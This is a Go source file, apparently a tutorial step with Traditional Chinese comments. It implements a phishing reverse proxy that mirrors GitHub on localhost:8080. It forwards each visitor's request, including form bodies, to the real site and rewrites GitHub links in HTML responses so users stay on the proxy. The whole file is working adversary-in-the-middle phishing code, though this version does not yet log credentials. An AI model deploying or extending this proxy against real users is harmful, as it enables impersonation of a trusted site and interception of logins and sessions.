package main

import (
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

const (
	phishPort   = "8080"
	upstreamURL = "https://github.com"
	phishURL    = "http://localhost:8080"
)

func main() {
	http.HandleFunc("/", handler)
	err := http.ListenAndServe(":"+phishPort, nil)
	if err != nil {
		panic(err)
	}
}

func handler(w http.ResponseWriter, r *http.Request) {
	req := cloneRequest(r)
	body, header := sendReqToUpstream(req)
	body = replaceURLInResp(body, header)
	w.Write(body)
}

func cloneRequest(r *http.Request) *http.Request {
	// 取得原請求的 method、body
	method := r.Method
	body := r.Body

	// 取得原請求的 url，把它的域名替換成真正的 Github
	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := upstreamURL + path + "?" + rawQuery

	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}
	return req
}

func sendReqToUpstream(req *http.Request) ([]byte, http.Header) {
	// 建立 http client
	client := http.Client{}

	// client.Do(req) 會發出請求到 Github、得到回覆 resp
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	// 把回覆的 body 從 Reader（串流）轉成 []byte
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	resp.Body.Close()
	return respBody, resp.Header
}

func replaceURLInResp(body []byte, header http.Header) []byte {
	// 判斷 Content-Type 是不是 text/html
	contentType := header.Get("Content-type")
	isHTML := strings.Contains(contentType, "text/html")
	if !isHTML {
		return body
	}
	// 把 https://github.com 取代為 http://localhost:8080
	// strings.Replace 最後一個參數是指最多取代幾個，-1 就是全部都取代
	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)

	// 尋找符合 git 網址的特徵
	re, err := regexp.Compile(phishURL + "(.*).git")
	if err != nil {
		panic(err)
	}

	bodyStr = re.ReplaceAllString(bodyStr, upstreamURL+"$1.git")

	return []byte(bodyStr)
}
